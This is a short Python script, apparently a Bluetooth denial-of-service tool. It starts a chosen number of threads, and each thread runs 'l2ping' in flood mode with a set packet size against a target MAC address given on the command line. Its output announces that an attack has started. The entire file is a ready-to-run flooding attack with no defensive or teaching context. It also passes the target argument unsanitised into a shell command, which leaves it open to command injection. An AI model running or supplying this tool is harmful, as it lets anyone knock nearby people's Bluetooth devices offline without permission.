import os
import threading
import time
import colorama
import sys
from colorama import Fore
colorama.init()
if len(sys.argv) < 4:
    sys.exit()

def DOS(target_addr, packages_size):
    os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)

def main():
    target_addr = sys.argv[1]
    try:
        packages_size = int(sys.argv[2])
    except:
        print(Fore.RED+'[-]'+Fore.RESET+' Packages size must be an integer')
        exit(0)
    try:
        threads_count = int(sys.argv[3])
    except:
        print(Fore.RED+'[-]'+Fore.RESET+' Threads count must be an integer')
        exit(0)
    print(Fore.BLUE+'[*]'+Fore.RESET+' Checking MAC address...')
    time.sleep(0.3)
    print(Fore.BLUE+'[*]'+Fore.RESET+' Building threads...')
    for i in range(0, threads_count):
        threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()

    print(Fore.BLUE+'[*]'+Fore.RESET+f' Attack Started On {target_addr}.')

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        time.sleep(0.1)
        print(Fore.RED+'[-]'+Fore.RESET+' Aborted')
        exit(0)
    except Exception as e:
        time.sleep(0.1)
        print(Fore.RED+'[-] ERROR:'+Fore.RESET+' ' + str(e))
